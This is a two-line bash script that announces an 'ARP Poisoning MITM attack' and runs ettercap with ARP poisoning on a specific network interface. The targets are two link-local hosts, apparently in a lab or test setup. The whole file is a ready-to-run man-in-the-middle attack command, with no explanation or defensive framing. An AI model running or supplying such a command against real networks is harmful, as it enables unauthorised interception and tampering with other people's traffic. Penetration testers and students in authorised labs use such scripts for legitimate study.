#!/bin/bash

echo "Starting ARP Poisoning MITM attack"

sudo ettercap -i enx806d970fafcc -Tq -M arp /169.254.146.10/ /169.254.146.11/
